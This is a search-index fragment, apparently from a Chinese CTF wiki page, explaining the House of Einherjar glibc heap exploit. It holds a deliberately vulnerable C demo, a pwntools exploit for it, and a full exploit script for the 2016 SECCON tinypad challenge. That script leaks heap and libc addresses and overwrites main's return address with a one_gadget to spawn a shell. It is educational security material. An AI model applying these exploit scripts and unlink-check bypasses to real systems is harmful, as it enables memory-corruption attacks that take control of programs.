\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk \u4f1a\u5171\u4eab prev_size \u5b57\u6bb5\uff0c\u5c24\u5176\u662f\u5f53\u4f4e\u5730\u5740\u7684 chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u9ad8\u5730\u5740\u7684chunk\u7684\u8be5\u5b57\u6bb5\u4fbf\u53ef\u4ee5\u88ab\u4f4e\u5730\u5740\u7684 chunk \u4f7f\u7528\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u6709\u5e0c\u671b\u53ef\u4ee5\u901a\u8fc7\u5199\u4f4e\u5730\u5740 chunk \u8986\u76d6\u9ad8\u5730\u5740 chunk \u7684 prev_size \u5b57\u6bb5\u3002 \u4e00\u4e2a chunk PREV_INUSE \u4f4d\u6807\u8bb0\u4e86\u5176\u7269\u7406\u76f8\u90bb\u7684\u4f4e\u5730\u5740 chunk \u7684\u4f7f\u7528\u72b6\u6001\uff0c\u800c\u4e14\u8be5\u4f4d\u662f\u548c prev_size \u7269\u7406\u76f8\u90bb\u7684\u3002 \u540e\u5411\u5408\u5e76\u65f6\uff0c\u65b0\u7684 chunk \u7684\u4f4d\u7f6e\u53d6\u51b3\u4e8e chunk_at_offset(p, -((long) prevsize)) \u3002 \u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u4e00\u4e2achunk prev_size \u4e0e PREV_INUSE \u5b57\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u65b0\u7684 chunk \u6307\u5411\u51e0\u4e4e\u4efb\u4f55\u4f4d\u7f6e\u3002 \u5229\u7528\u8fc7\u7a0b \u00b6 \u6ea2\u51fa\u524d \u00b6 \u5047\u8bbe\u6ea2\u51fa\u524d\u7684\u72b6\u6001\u5982\u4e0b \u6ea2\u51fa \u00b6 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe p0 \u5806\u5757\u4e00\u65b9\u9762\u53ef\u4ee5\u5199prev_size\u5b57\u6bb5\uff0c\u53e6\u4e00\u65b9\u9762\uff0c\u5b58\u5728off by one\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5199\u4e0b\u4e00\u4e2a chunk \u7684PREV_INUSE \u90e8\u5206\uff0c\u90a3\u4e48 \u6ea2\u51fa\u540e \u00b6 \u5047\u8bbe\u6211\u4eec\u5c06 p1\u7684 prev_size \u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u76ee\u7684 chunk \u4f4d\u7f6e\u4e0ep1\u7684\u5dee\u503c \u3002\u5728\u6ea2\u51fa\u540e\uff0c\u6211\u4eec\u91ca\u653ep1\uff0c\u5219\u6211\u4eec\u6240\u5f97\u5230\u7684\u65b0\u7684 chunk \u7684\u4f4d\u7f6e chunk_at_offset(p1, -((long) prevsize)) \u5c31\u662f\u6211\u4eec\u60f3\u8981\u7684 chunk \u4f4d\u7f6e\u4e86\u3002 \u5f53\u7136\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u8fd9\u91cc\u4f1a\u5bf9\u65b0\u7684 chunk \u8fdb\u884c unlink \uff0c\u56e0\u6b64\u9700\u8981\u786e\u4fdd\u5728\u5bf9\u5e94 chunk \u4f4d\u7f6e\u6784\u9020\u597d\u4e86fake chunk \u4ee5\u4fbf\u4e8e\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002 \u653b\u51fb\u8fc7\u7a0b\u793a\u4f8b \u00b6 \u53ef\u4ee5\u8fdb\u884c House Of Einherjar \u653b\u51fb\u7684\u4ee3\u7801\uff1a #include <stdio.h> #include <stdlib.h> #include <unistd.h> int main ( void ){ char * s0 = malloc ( 0x200 ); \u3000 //\u6784\u9020fake chunk char * s1 = malloc ( 0x18 ); char * s2 = malloc ( 0xf0 ); \u3000 char * s3 = malloc ( 0x20 ); //\u4e3a\u4e86\u4e0d\u8ba9s2\u4e0etop chunk \u5408\u5e76 printf ( \"begin \\n \" ); printf ( \"%p \\n \" , s0 ); printf ( \"input s0 \\n \" ); read ( 0 , s0 , 0x200 ); //\u8bfb\u5165fake chunk printf ( \"input s1 \\n \" ); read ( 0 , s1 , 0x19 ); //Off By One free ( s2 ); return 0 ; } \u653b\u51fb\u4ee3\u7801\u5982\u4e0b\uff1a from pwn import * p = process ( \"./example\" ) context . log_level = 'debug' #gdb.attach(p) p . recvuntil ( \"begin \\n \" ) address = int ( p . recvline () . strip (), 16 ) p . recvuntil ( \"input s0 \\n \" ) payload = p64 ( 0 ) + p64 ( 0x101 ) + p64 ( address ) * 2 + \"A\" * 0xe0 ''' p64(address) * 2\u662f\u4e3a\u4e86\u7ed5\u8fc7 if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\"); ''' payload += p64 ( 0x100 ) #fake size p . sendline ( payload ) p . recvuntil ( \"input s1 \\n \" ) payload = \"A\" * 0x10 + p64 ( 0x220 ) + \" \\x00 \" p . sendline ( payload ) p . recvall () p . close () \u6ce8\u610f\u8fd9\u91cc\u7ed5\u8fc7unlink\u68c0\u67e5\u7684\u65b9\u6cd5\u8ddf\u4e4b\u524d\u5229\u7528unlink\u6f0f\u6d1e\u65f6\u91c7\u7528\u7684\u65b9\u6cd5\u4e0d\u4e00\u6837 \u5229\u7528unlink\u6f0f\u6d1e\u7684\u65f6\u5019\uff1a p -> fd = & p - 3 * 4 p -> bk = & p - 2 * 4 \u5728\u8fd9\u91cc\u5229\u7528\u65f6\uff0c\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u627e\u5230 &p ,\u6240\u4ee5\u76f4\u63a5\u8ba9\uff1a p -> fd = p p -> bk = p \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e00\u4e2a\u70b9\uff1a payload = p64 ( 0 ) + p64 ( 0x101 ) + p64 ( address ) * 2 + \"A\" * 0xe0 \u5176\u5b9e\u4fee\u6539\u4e3a\u4e0b\u9762\u8fd9\u6837\u4e5f\u662f\u53ef\u4ee5\u7684: payload = p64 ( 0 ) + p64 ( 0x221 ) + p64 ( address ) * 2 + \"A\" * 0xe0 \u6309\u7167\u9053\u7406\u6765\u8bb2 fake chunk \u7684 size \u662f 0x221 \u624d\u5408\u7406\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48 0x101 \u4e5f\u53ef\u4ee5\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5bf9 size \u548c prev_size \u7684\u9a8c\u8bc1\u53ea\u53d1\u751f\u5728 unlink \u91cc\u9762\uff0c\u800c unlink \u91cc\u9762\u662f\u8fd9\u6837\u9a8c\u8bc1\u7684: if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \u6240\u4ee5\u53ea\u9700\u8981\u518d\u4f2a\u9020 fake chunk \u7684 next chunk \u7684 prev_size \u5b57\u6bb5\u5c31\u597d\u4e86\u3002 \u603b\u7ed3 \u00b6 \u8fd9\u91cc\u6211\u4eec\u603b\u7ed3\u4e0b\u8fd9\u4e2a\u5229\u7528\u6280\u672f\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9 \u9700\u8981\u6709\u6ea2\u51fa\u6f0f\u6d1e\u53ef\u4ee5\u5199\u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740\u7684 prev_size \u4e0e PREV_INUSE \u90e8\u5206\u3002 \u6211\u4eec\u9700\u8981\u8ba1\u7b97\u76ee\u7684 chunk \u4e0e p1 \u5730\u5740\u4e4b\u95f4\u7684\u5dee\uff0c\u6240\u4ee5\u9700\u8981\u6cc4\u6f0f\u5730\u5740\u3002 \u6211\u4eec\u9700\u8981\u5728\u76ee\u7684 chunk \u9644\u8fd1\u6784\u9020\u76f8\u5e94\u7684 fake chunk\uff0c\u4ece\u800c\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002 \u5176\u5b9e\uff0c\u8be5\u6280\u672f\u4e0e chunk extend/shrink \u6280\u672f\u6bd4\u8f83\u7c7b\u4f3c\u3002 2016 Seccon tinypad \u00b6 \u57fa\u672c\u529f\u80fd\u5206\u6790 \u00b6 \u9996\u5148\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ee5\u6765\u4e00\u4e2a\u6838\u5fc3\u7684\u8bfb\u53d6\u51fd\u6570\uff0c\u5373\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u8282\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u800c\uff0c\u5f53\u8bfb\u53d6\u7684\u957f\u5ea6\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u957f\u5ea6\u65f6\uff0c\u4f1a\u51fa\u73b0 off by one \u7684\u6f0f\u6d1e \u3002 \u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u6211\u4eec\u4e0d\u96be\u770b\u51fa\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f\u64cd\u4f5c\u4e00\u4e2a tinypad\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u64cd\u4f5c \u5f00\u5934\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u5f00\u5934\u4f9d\u6b21\u5224\u65ad\u6bcf\u4e2a memo \u7684\u6307\u9488\u6765\u5224\u65ad\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u8fdb\u800c\u5229\u7528 strlen \u6c42\u5f97\u5176\u76f8\u5e94\u7684\u957f\u5ea6\uff0c\u5c06 memo \u7684\u5185\u5bb9\u8f93\u51fa\u3002\u4ece\u8fd9\u91cc\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u51fa\u6700\u591a\u6709 4 \u4e2a memo\u3002 \u6dfb\u52a0 memo\uff0c\u904d\u5386\u5b58\u50a8 memo \u7684\u53d8\u91cftinypad\uff0c\u6839\u636e tinypad \u7684\u5b58\u50a8\u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u4f7f\u7528\uff0c\u7136\u540e\u8fd8\u6709\u7684\u8bdd\uff0c\u5206\u914d\u4e00\u4e2a memo\u3002\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c\u7a0b\u5e8f\u53ea\u662f\u4ece tinypad \u8d77\u59cb\u504f\u79fb16*16=256 \u5904\u624d\u5f00\u59cb\u4f7f\u7528\uff0c\u6bcf\u4e2a memo \u5b58\u50a8\u4e24\u4e2a\u5b57\u6bb5\uff0c\u4e00\u4e2a\u662f\u8be5 memo \u7684\u5927\u5c0f\uff0c\u53e6\u4e00\u4e2a\u662f\u8be5 memo \u5bf9\u5e94\u7684\u6307\u9488\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ed3\u6784\u4f53\uff0c\u5e76\u4fee\u6539 ida \u8bc6\u522b\u7684 tinypad\uff0c\u4f7f\u4e4b\u66f4\u52a0\u53ef\u8bfb\uff08\u4f46\u662f\u5176\u5b9e ida \u6ca1\u6709\u529e\u6cd5\u5e2e\u5fd9\u667a\u80fd\u8bc6\u522b\u3002\uff09\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u8be5\u6dfb\u52a0\u529f\u80fd\u4f9d\u8d56\u4e8e\u8bfb\u53d6\u51fd\u6570\uff0c\u6240\u4ee5\u5b58\u5728 off by one \u7684\u6f0f\u6d1e\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u7528\u6237\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u6700\u5927\u4e3a 256 \u5b57\u8282\uff0c\u548c tinypad \u524d\u9762\u7684\u672a\u4f7f\u7528\u7684 256 \u5b57\u8282\u6070\u597d\u4e00\u81f4\u3002 \u5220\u9664\uff0c\u6839\u636e\u5b58\u50a8 memo \u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u88ab\u4f7f\u7528\uff0c\u540c\u65f6\u5c06\u76f8\u5e94 memo \u5927\u5c0f\u8bbe\u7f6e\u4e3a0\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u6307\u9488\u8bbe\u7f6e\u4e3a NULL\uff0c\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4 Use After Free\u3002 \u5373\u5728\u7a0b\u5e8f\u5f00\u5934\u65f6\uff0c\u5c31\u6709\u53ef\u80fd\u8f93\u51fa\u4e00\u4e9b\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u6cc4\u6f0f\u4e00\u4e9b\u57fa\u5730\u5740\u7684\u57fa\u7840 \u3002 \u7f16\u8f91\u3002\u5728\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u6839\u636e\u4e4b\u524d\u5b58\u50a8\u7684 memo \u7684\u5185\u5bb9\u5c06\u5176\u62f7\u8d1d\u5230 tinypad \u7684\u524d 256 \u4e2a\u5b57\u8282\u4e2d\uff0c\u4f46\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684\uff0c\u5f53 memo \u5b58\u50a8\u4e86 256 \u4e2a\u5b57\u8282\u65f6\uff0c\u5c31\u4f1a\u5b58\u5728 off by one\u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7a0b\u5e8f\u5229\u7528 strlen \u5224\u65ad\u590d\u5236\u4e4b\u540e\u7684 tinypad \u7684\u5185\u5bb9\u957f\u5ea6\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002\u4e4b\u540e\u7a0b\u5e8f\u7ee7\u7eed\u5229\u7528 strlen \u6c42\u5f97 memo \u7684\u957f\u5ea6\uff0c\u5e76\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u5230 tinypad \u4e2d\uff0c\u6839\u636e\u8bfb\u53d6\u51fd\u6570\uff0c\u8fd9\u91cc\u5fc5\u7136\u51fa\u73b0\u4e86 \\x00 \u3002\u6700\u540e\u7a0b\u5e8f\u5c06\u8bfb\u53d6\u5230 tinypad \u524d 256 \u5b57\u8282\u7684\u5185\u5bb9\u653e\u5230\u5bf9\u5e94 memo \u4e2d\u3002 \u9000\u51fa \u5229\u7528 \u00b6 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528\u5220\u9664\u65f6\u6ca1\u6709\u5c06\u6307\u9488\u7f6e\u4e3aNULL\u7684 UAF \u6f0f\u6d1e\uff0c\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740 \u518d\u6b21\u5229\u7528 UAF \u6f0f\u6d1e\u6cc4\u6f0f libc \u7684\u57fa\u5730\u5740\u3002 \u5229\u7528 house of einherjar \u65b9\u6cd5\u5728 tinypad \u7684\u524d 256 \u5b57\u8282\u4e2d\u4f2a\u9020 chunk\u3002\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u65f6\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u63a7\u52364\u4e2a memo \u7684\u6307\u9488\u548c\u5185\u5bb9\u4e86\u3002 \u8fd9\u91cc\u867d\u7136\u6211\u4eec\u7684\u7b2c\u4e00\u60f3\u6cd5\u53ef\u80fd\u662f\u76f4\u63a5\u8986\u76d6 malloc_hook \u4e3a one_gadget \u5730\u5740\uff0c\u4f46\u662f\uff0c\u7531\u4e8e\u5f53\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u662f\u5229\u7528 strlen \u6765\u5224\u8bfb\u53ef\u4ee5\u8bfb\u53d6\u591a\u5c11\u957f\u5ea6\uff0c\u800c malloc_hook \u5219\u5728\u521d\u59cb\u65f6\u4e3a 0\u3002\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8986\u76d6\uff0c\u6240\u4ee5\u8fd9\u91cc\u91c7\u7528\u5176\u4ed6\u65b9\u6cd5\uff0c\u5373\u4fee\u6539\u7a0b\u5e8f\u7684 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget\uff0c\u4e4b\u6240\u4ee5\u53ef\u4ee5\u884c\u5f97\u901a\uff0c\u662f\u56e0\u4e3a\u8fd4\u56de\u5730\u5740\u5f80\u5f80\u662f 7f \u5f00\u5934\u7684\uff0c\u957f\u5ea6\u8db3\u591f\u957f\uff0c\u53ef\u4ee5\u8986\u76d6\u4e3aone_gadget\u3002\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u9700\u8981\u6cc4\u6f0f main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u7531\u4e8e libc \u4e2d\u5b58\u50a8\u4e86 main \u51fd\u6570 environ \u6307\u9488\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5148\u6cc4\u9732\u51faenviron \u7684\u5730\u5740\uff0c\u7136\u540e\u5728\u5f97\u77e5\u5b58\u50a8 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002\u8fd9\u91cc\u9009\u53d6 environ \u7b26\u53f7\u662f\u56e0\u4e3a environ \u7b26\u53f7\u5728 libc \u4e2d\u4f1a\u5bfc\u51fa\uff0c\u800c\u50cf argc \u548c argv \u5219\u4e0d\u4f1a\u5bfc\u51fa\uff0c\u76f8\u5bf9\u6765\u8bf4\u4f1a\u6bd4\u8f83\u9ebb\u70e6\u4e00\u70b9\u3002 \u6700\u540e\u4fee\u6539 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget \u5730\u5740\u83b7\u53d6shell\u3002 \u5177\u4f53\u5229\u7528\u811a\u672c\u5982\u4e0b from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' tinypad = ELF ( \"./tinypad\" ) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) libc = ELF ( './libc.so.6' ) else : p = process ( \"./tinypad\" ) libc = ELF ( './libc.so.6' ) main_arena_offset = 0x3c4b20 log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) def add ( size , content ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'a' ) p . recvuntil ( '(SIZE)>>> ' ) p . sendline ( str ( size )) p . recvuntil ( '(CONTENT)>>> ' ) p . sendline ( content ) def edit ( idx , content ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'e' ) p . recvuntil ( '(INDEX)>>> ' ) p . sendline ( str ( idx )) p . recvuntil ( '(CONTENT)>>> ' ) p . sendline ( content ) p . recvuntil ( 'Is it OK? \\n ' ) p . sendline ( 'Y' ) def delete ( idx ): p . recvuntil ( '(CMD)>>> ' ) p . sendline ( 'd' ) p . recvuntil ( '(INDEX)>>> ' ) p . sendline ( str ( idx )) def run (): p . recvuntil ( ' ============================================================================ \\n\\n ' ) # 1. leak heap base add ( 0x70 , 'a' * 8 ) # idx 0 add ( 0x70 , 'b' * 8 ) # idx 1 add ( 0x100 , 'c' * 8 ) # idx 2 delete ( 2 ) # delete idx 1 delete ( 1 ) # delete idx 0, idx 0 point to idx 1 p . recvuntil ( ' # CONTENT: ' ) data = p . recvuntil ( ' \\n ' , drop = True ) # get pointer point to idx1 heap_base = u64 ( data . ljust ( 8 , ' \\x00 ' )) - 0x80 log . success ( 'get heap base: ' + hex ( heap_base )) # 2. leak libc base # this will trigger malloc_consolidate # first idx0 will go to unsorted bin # second idx1 will merge with idx0(unlink), and point to idx0 # third idx1 will merge into top chunk # but cause unlink feture, the idx0's fd and bk won't change # so idx0 will leak the unsorted bin addr delete ( 3 ) p . recvuntil ( ' # CONTENT: ' ) data = p . recvuntil ( ' \\n ' , drop = True ) unsorted_offset_arena = 8 + 10 * 8 main_arena = u64 ( data . ljust ( 8 , ' \\x00 ' )) - unsorted_offset_arena libc_base = main_arena - main_arena_offset log . success ( 'main arena addr: ' + hex ( main_arena )) log . success ( 'libc base addr: ' + hex ( libc_base )) # 3. house of einherjar add ( 0x18 , 'a' * 0x18 ) # idx 0 # we would like trigger house of einherjar at idx 1 add ( 0x100 , 'b' * 0xf8 + ' \\x11 ' ) # idx 1 add ( 0x100 , 'c' * 0xf8 ) # idx 2 add ( 0x100 , 'd' * 0xf8 ) #idx 3 # create a fake chunk in tinypad's 0x100 buffer, offset 0x20 tinypad_addr = 0x602040 fakechunk_addr = tinypad_addr + 0x20 fakechunk_size = 0x101 fakechunk = p64 ( 0 ) + p64 ( fakechunk_size ) + p64 ( fakechunk_addr ) + p64 ( fakechunk_addr ) edit ( 3 , 'd' * 0x20 + fakechunk ) # overwrite idx 1's prev_size and # set minaddr of size to '\\x00' # idx 0's chunk size is 0x20 diff = heap_base + 0x20 - fakechunk_addr log . info ( 'diff between idx1 and fakechunk: ' + hex ( diff )) # '\\0' padding caused by strcpy diff_strip = p64 ( diff ) . strip ( ' \\0 ' ) number_of_zeros = len ( p64 ( diff )) - len ( diff_strip ) for i in range ( number_of_zeros + 1 ): data = diff_strip . rjust ( 0x18 - i , 'f' ) edit ( 1 , data ) delete ( 2 ) p . recvuntil ( ' \\n Deleted.' ) # fix the fake chunk size, fd and bk # fd and bk must be unsorted bin edit ( 4 , 'd' * 0x20 + p64 ( 0 ) + p64 ( 0x101 ) + p64 ( main_arena + 88 ) + p64 ( main_arena + 88 )) # 3. overwrite malloc_hook with one_gadget one_gadget_addr = libc_base + 0x45216 environ_pointer = libc_base + libc . symbols [ '__environ' ] log . info ( 'one gadget addr: ' + hex ( one_gadget_addr )) log . info ( 'environ pointer addr: ' + hex ( environ_pointer )) #fake_malloc_chunk = main_arena - 60 + 9 # set memo[0].size = 'a'*8, # set memo[0].content point to environ to leak environ addr fake_pad = 'f' * ( 0x100 - 0x20 - 0x10 ) + 'a' * 8 + p64 ( environ_pointer ) + 'a' * 8 + p64 ( 0x602148 ) # get a fake chunk add ( 0x100 - 8 , fake_pad ) # idx 2 #gdb.attach(p) # get environ addr p . recvuntil ( ' # CONTENT: ' ) environ_addr = p . recvuntil ( ' \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' ) environ_addr = u64 ( environ_addr ) main_ret_addr = environ_addr - 30 * 8 # set memo[0].content point to main_ret_addr edit ( 2 , p64 ( main_ret_addr )) # overwrite main_ret_addr with one_gadget addr edit ( 1 , p64 ( one_gadget_addr )) p . interactive () if __name__ == \"__main__\" : run () \u53c2\u8003\u6587\u732e \u00b6 https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606 https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf https://bbs.pediy.com/thread-226119.htm","title":"House Of Einherjar"},{"location":"pwn/heap/house_of_einherjar/#house-of-einherjar","text":"","title":"House Of Einherjar"},{"location":"pwn/heap/house_of_einherjar/#_1","text":"house of einherjar \u662f\u4e00\u79cd\u5806\u5229\u7528\u6280\u672f\uff0c\u7531 Hiroki Matsukuma \u63d0\u51fa\u3002\u8be5\u5806\u5229\u7528\u6280\u672f\u53ef\u4ee5\u5f3a\u5236\u4f7f\u5f97 malloc \u8fd4\u56de\u4e00\u4e2a\u51e0\u4e4e\u4efb\u610f\u5730\u5740\u7684 chunk \u3002\u5176\u4e3b\u8981\u5728\u4e8e\u6ee5\u7528 free \u4e2d\u7684\u540e\u5411\u5408\u5e76\u64cd\u4f5c\uff08\u5408\u5e76\u4f4e\u5730\u5740\u7684chunk\uff09\uff0c\u4ece\u800c\u4f7f\u5f97\u5c3d\u53ef\u80fd\u907f\u514d\u788e\u7247\u5316\u3002 \u6b64\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4e00\u4e9b\u7279\u6b8a\u5927\u5c0f\u7684\u5806\u5757\u4e2d\uff0coff by one \u4e0d\u4ec5\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 PREV_INUSE \u6bd4\u7279\u4f4d\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/house_of_einherjar/#_2","text":"","title":"\u539f\u7406"},{"location":"pwn/heap/house_of_einherjar/#_3","text":"free \u51fd\u6570\u4e2d\u7684\u540e\u5411\u5408\u5e76\u6838\u5fc3\u64cd\u4f5c\u5982\u4e0b /* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( av , p , bck , fwd ); } \u8fd9\u91cc\u501f\u7528\u539f\u4f5c\u8005\u7684\u4e00\u5f20\u56fe\u7247\u8bf4\u660e \u5173\u4e8e\u6574\u4f53\u7684\u64cd\u4f5c\uff0c\u8bf7\u53c2\u8003 \u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0 \u90a3\u4e00\u7ae0\u8282\u3002","title":"\u540e\u5411\u5408\u5e76\u64cd\u4f5c"},{"location":"pwn/heap/house_of_einherjar/#_4","text":"\u8fd9\u91cc\u6211\u4eec\u5c31\u4ecb\u7ecd\u8be5\u5229\u7528\u7684\u539f\u7406\u3002\u9996\u5148\uff0c\u5728\u4e4b\u524d\u7684\u5806\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee5\u4e0b\u7684\u77e5\u8bc6 \u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk \u4f1a\u5171\u4eab prev_size \u5b57\u6bb5\uff0c\u5c24\u5176\u662f\u5f53\u4f4e\u5730\u5740\u7684 chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u9ad8\u5730\u5740\u7684chunk\u7684\u8be5\u5b57\u6bb5\u4fbf\u53ef\u4ee5\u88ab\u4f4e\u5730\u5740\u7684 chunk \u4f7f\u7528\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u6709\u5e0c\u671b\u53ef\u4ee5\u901a\u8fc7\u5199\u4f4e\u5730\u5740 chunk \u8986\u76d6\u9ad8\u5730\u5740 chunk \u7684 prev_size \u5b57\u6bb5\u3002 \u4e00\u4e2a chunk PREV_INUSE \u4f4d\u6807\u8bb0\u4e86\u5176\u7269\u7406\u76f8\u90bb\u7684\u4f4e\u5730\u5740 chunk \u7684\u4f7f\u7528\u72b6\u6001\uff0c\u800c\u4e14\u8be5\u4f4d\u662f\u548c prev_size \u7269\u7406\u76f8\u90bb\u7684\u3002 \u540e\u5411\u5408\u5e76\u65f6\uff0c\u65b0\u7684 chunk \u7684\u4f4d\u7f6e\u53d6\u51b3\u4e8e chunk_at_offset(p, -((long) prevsize)) \u3002 \u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u4e00\u4e2achunk prev_size \u4e0e PREV_INUSE \u5b57\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u65b0\u7684 chunk \u6307\u5411\u51e0\u4e4e\u4efb\u4f55\u4f4d\u7f6e\u3002","title":"\u5229\u7528\u539f\u7406"},{"location":"pwn/heap/house_of_einherjar/#_5","text":"","title":"\u5229\u7528\u8fc7\u7a0b"},{"location":"pwn/heap/house_of_einherjar/#_6","text":"\u5047\u8bbe\u6ea2\u51fa\u524d\u7684\u72b6\u6001\u5982\u4e0b","title":"\u6ea2\u51fa\u524d"},{"location":"pwn/heap/house_of_einherjar/#_7","text":"\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe p0 \u5806\u5757\u4e00\u65b9\u9762\u53ef\u4ee5\u5199prev_size\u5b57\u6bb5\uff0c\u53e6\u4e00\u65b9\u9762\uff0c\u5b58\u5728off by one\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5199\u4e0b\u4e00\u4e2a chunk \u7684PREV_INUSE \u90e8\u5206\uff0c\u90a3\u4e48","title":"\u6ea2\u51fa"},{"location":"pwn/heap/house_of_einherjar/#_8","text":"\u5047\u8bbe\u6211\u4eec\u5c06 p1\u7684 prev_size \u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u76ee\u7684 chunk \u4f4d\u7f6e\u4e0ep1\u7684\u5dee\u503c \u3002\u5728\u6ea2\u51fa\u540e\uff0c\u6211\u4eec\u91ca\u653ep1\uff0c\u5219\u6211\u4eec\u6240\u5f97\u5230\u7684\u65b0\u7684 chunk \u7684\u4f4d\u7f6e chunk_at_offset(p1, -((long) prevsize)) \u5c31\u662f\u6211\u4eec\u60f3\u8981\u7684 chunk \u4f4d\u7f6e\u4e86\u3002 \u5f53\u7136\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u8fd9\u91cc\u4f1a\u5bf9\u65b0\u7684 chunk \u8fdb\u884c unlink \uff0c\u56e0\u6b64\u9700\u8981\u786e\u4fdd\u5728\u5bf9\u5e94 chunk \u4f4d\u7f6e\u6784\u9020\u597d\u4e86fake chunk \u4ee5\u4fbf\u4e8e\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002","title":"\u6ea2\u51fa\u540e"},{"location":"pwn/heap/house_of_einherjar/#_9","text":"\u53ef\u4ee5\u8fdb\u884c House Of Einherjar \u653b\u51fb\u7684\u4ee3\u7801\uff1a #include <stdio.h> #include <stdlib.h> #include <unistd.h> int main ( void ){ char * s0 = malloc 